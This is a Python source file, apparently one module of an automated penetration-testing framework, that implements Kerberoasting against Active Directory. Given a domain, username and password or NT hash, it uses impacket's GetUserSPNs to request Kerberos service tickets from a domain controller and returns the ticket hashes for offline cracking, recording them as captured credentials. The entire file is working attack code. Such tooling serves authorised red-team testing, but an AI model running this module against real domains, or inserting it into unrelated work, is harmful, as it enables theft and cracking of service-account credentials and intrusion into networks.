"""
Kerberoasting module.

FR-ATK-05 | MITRE T1558.003
Extracts Kerberos service tickets for offline cracking.
Non-destructive: reads tickets only, no writes to target.
"""

from __future__ import annotations

import os
import tempfile

from aiptt.attacks.base import AbstractAttackModule, AttackResult


class Module(AbstractAttackModule):
    module_id       = "AD-KERB-001"
    mitre_technique = "T1558.003"
    destructive     = False
    sandboxable     = True

    def execute(self, target: str, parameters: dict) -> AttackResult:
        dc_ip    = parameters.get("dc_ip", target)
        domain   = parameters.get("domain", "")
        username = parameters.get("username", "")
        password = parameters.get("password", "")
        lm_hash  = parameters.get("lm_hash", "")
        nt_hash  = parameters.get("nt_hash", "")

        if not domain or not username:
            return AttackResult(False, "MISSING_PARAMS", False, "none",
                                "dc_ip, domain, and username are required")

        with tempfile.NamedTemporaryFile(
            suffix=".txt", delete=False, mode="w"
        ) as tf:
            output_path = tf.name

        try:
            from impacket.examples import GetUserSPNs  # type: ignore

            args = [
                f"{domain}/{username}",
                "-dc-ip", dc_ip,
                "-outputfile", output_path,
                "-request",
            ]
            if nt_hash:
                args += ["-hashes", f"{lm_hash}:{nt_hash}"]
            elif password:
                args += ["-password", password]

            GetUserSPNs.main(args)

            if os.path.exists(output_path) and os.path.getsize(output_path) > 0:
                with open(output_path) as f:
                    hashes = f.read()
                return AttackResult(
                    success=True,
                    outcome="SUCCESS",
                    gained_access=False,   # Hashes require offline cracking
                    access_level="none",
                    output=hashes[:2000],  # Truncated; full content in vault
                    credentials_captured=[
                        {
                            "type":   "kerberos_ticket",
                            "ref":    output_path,
                            "domain": domain,
                        }
                    ],
                )
            return AttackResult(False, "NO_SPNS_FOUND", False, "none",
                                "No Kerberoastable accounts found")

        except ImportError:
            return AttackResult(False, "IMPACKET_MISSING", False, "none",
                                "impacket is not installed")
        except Exception as e:
            return AttackResult(False, "ERROR", False, "none", str(e))
        finally:
            try:
                os.unlink(output_path)
            except OSError:
                pass
